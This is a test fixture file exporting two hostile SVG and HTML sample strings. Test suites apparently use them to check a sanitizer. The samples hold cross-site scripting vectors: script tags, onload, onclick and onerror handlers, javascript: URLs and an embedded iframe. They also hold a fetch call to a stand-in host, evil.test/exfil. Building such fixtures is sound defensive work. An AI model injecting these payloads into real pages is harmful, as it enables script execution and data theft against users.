// Hostile samples shared by the vitest suites. The Playwright spec carries its own copy
// (it runs outside Vite).

export const MALICIOUS_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ' +
  'width="40" height="40" onload="window.__pwned = 1">' +
  "<script>window.__pwned = 1</script>" +
  '<foreignObject width="40" height="40"><iframe xmlns="http://www.w3.org/1999/xhtml" src="http://evil.test/f"></iframe></foreignObject>' +
  '<image href="http://evil.test/x.png" width="10" height="10"/>' +
  '<a xlink:href="javascript:window.__pwned=1"><rect width="10" height="10" onclick="window.__pwned=1"/></a>' +
  '<use href="http://evil.test/sprite.svg#a"/>' +
  '<set attributeName="href" to="javascript:window.__pwned=1"/>' +
  '<rect width="5" height="5" fill="url(http://evil.test/p)" style="fill:url(http://evil.test/p)"/>' +
  '<circle cx="20" cy="20" r="8" fill="#336699"/>' +
  "</svg>";

export const MALICIOUS_HTML =
  "<!doctype html><html><body><h1>hostile</h1>" +
  "<script>window.__pwned = 1; fetch('http://evil.test/exfil')</script>" +
  '<img src="http://evil.test/pixel.png" onerror="window.__pwned = 1">' +
  "</body></html>";
